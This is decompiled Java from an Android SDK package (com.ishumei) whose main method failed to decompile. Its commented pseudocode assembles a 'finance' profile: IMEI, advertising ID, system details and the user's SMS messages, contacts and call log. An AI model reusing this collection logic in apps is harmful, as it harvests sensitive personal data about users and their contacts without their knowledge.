package com.ishumei.a;

public class c implements d {
    private static final String a = c.class.getCanonicalName();
    private static c b = null;

    public static c a() {
        if (b == null) {
            synchronized (c.class) {
                if (b == null) {
                    b = new c();
                }
            }
        }
        return b;
    }

    /* JADX WARNING: inconsistent code. */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public java.util.Map<java.lang.String, java.lang.Object> a(int r7) {
        /*
        r6 = this;
        r0 = new java.util.HashMap;
        r0.<init>();
        r1 = "rtype";
        r2 = "finance";
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r1 = "os";
        r2 = "android";
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r1 = "osver";
        r2 = android.os.Build.VERSION.RELEASE;	 Catch:{ Exception -> 0x00d5 }
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r1 = "sdkver";
        r2 = "2.3.6";
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r1 = "t";
        r2 = java.lang.System.currentTimeMillis();	 Catch:{ Exception -> 0x00d5 }
        r2 = java.lang.Long.valueOf(r2);	 Catch:{ Exception -> 0x00d5 }
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r1 = "appname";
        r2 = com.ishumei.d.b.a();	 Catch:{ Exception -> 0x00d5 }
        r2 = r2.f();	 Catch:{ Exception -> 0x00d5 }
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r1 = "appver";
        r2 = com.ishumei.d.b.a();	 Catch:{ Exception -> 0x00d5 }
        r2 = r2.e();	 Catch:{ Exception -> 0x00d5 }
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r1 = "imei";
        r2 = com.ishumei.d.l.a();	 Catch:{ Exception -> 0x00d5 }
        r2 = r2.c();	 Catch:{ Exception -> 0x00d5 }
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r1 = "adid";
        r2 = com.ishumei.d.j.a();	 Catch:{ Exception -> 0x00d5 }
        r2 = r2.b();	 Catch:{ Exception -> 0x00d5 }
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r1 = "sys";
        r2 = com.ishumei.d.c.a();	 Catch:{ Exception -> 0x00d5 }
        r2 = r2.b();	 Catch:{ Exception -> 0x00d5 }
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r2 = new java.util.HashMap;	 Catch:{ Exception -> 0x00d5 }
        r2.<init>();	 Catch:{ Exception -> 0x00d5 }
        r1 = com.ishumei.d.d.a();	 Catch:{ Exception -> 0x00bb }
        r1 = r1.d();	 Catch:{ Exception -> 0x00bb }
        r3 = "sms";
        r2.put(r3, r1);	 Catch:{ Exception -> 0x00bb }
    L_0x0081:
        r1 = com.ishumei.d.d.a();	 Catch:{ Exception -> 0x00eb }
        r1 = r1.c();	 Catch:{ Exception -> 0x00eb }
        r3 = "contact";
        r2.put(r3, r1);	 Catch:{ Exception -> 0x00eb }
    L_0x008e:
        r1 = com.ishumei.d.d.a();	 Catch:{ Exception -> 0x0105 }
        r1 = r1.b();	 Catch:{ Exception -> 0x0105 }
        r3 = "callLog";
        r2.put(r3, r1);	 Catch:{ Exception -> 0x0105 }
    L_0x009b:
        r1 = "financeInfo";
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r1 = "smid";
        r2 = com.ishumei.a.f.a();	 Catch:{ Exception -> 0x00d5 }
        r2 = r2.c();	 Catch:{ Exception -> 0x00d5 }
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
        r1 = "smidstat";
        r2 = com.ishumei.a.f.a();	 Catch:{ Exception -> 0x00d5 }
        r2 = r2.b();	 Catch:{ Exception -> 0x00d5 }
        r0.put(r1, r2);	 Catch:{ Exception -> 0x00d5 }
    L_0x00ba:
        return r0;
    L_0x00bb:
        r1 = move-exception;
        r3 = a;	 Catch:{ Exception -> 0x00d5 }
        r4 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x00d5 }
        r5 = "get message failed:";
        r4.<init>(r5);	 Catch:{ Exception -> 0x00d5 }
        r1 = r1.getMessage();	 Catch:{ Exception -> 0x00d5 }
        r1 = r4.append(r1);	 Catch:{ Exception -> 0x00d5 }
        r1 = r1.toString();	 Catch:{ Exception -> 0x00d5 }
        com.ishumei.f.c.b(r3, r1);	 Catch:{ Exception -> 0x00d5 }
        goto L_0x0081;
    L_0x00d5:
        r1 = move-exception;
        r2 = a;
        r3 = new java.lang.StringBuilder;
        r4 = "finance collect failed: ";
        r3.<init>(r4);
        r1 = r3.append(r1);
        r1 = r1.toString();
        com.ishumei.f.c.d(r2, r1);
        goto L_0x00ba;
    L_0x00eb:
        r1 = move-exception;
        r3 = a;	 Catch:{ Exception -> 0x00d5 }
        r4 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x00d5 }
        r5 = "get contact failed:";
        r4.<init>(r5);	 Catch:{ Exception -> 0x00d5 }
        r1 = r1.getMessage();	 Catch:{ Exception -> 0x00d5 }
        r1 = r4.append(r1);	 Catch:{ Exception -> 0x00d5 }
        r1 = r1.toString();	 Catch:{ Exception -> 0x00d5 }
        com.ishumei.f.c.b(r3, r1);	 Catch:{ Exception -> 0x00d5 }
        goto L_0x008e;
    L_0x0105:
        r1 = move-exception;
        r3 = a;	 Catch:{ Exception -> 0x00d5 }
        r4 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x00d5 }
        r5 = "get call failed:";
        r4.<init>(r5);	 Catch:{ Exception -> 0x00d5 }
        r1 = r1.getMessage();	 Catch:{ Exception -> 0x00d5 }
        r1 = r4.append(r1);	 Catch:{ Exception -> 0x00d5 }
        r1 = r1.toString();	 Catch:{ Exception -> 0x00d5 }
        com.ishumei.f.c.b(r3, r1);	 Catch:{ Exception -> 0x00d5 }
        goto L_0x009b;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.ishumei.a.c.a(int):java.util.Map<java.lang.String, java.lang.Object>");
    }
}
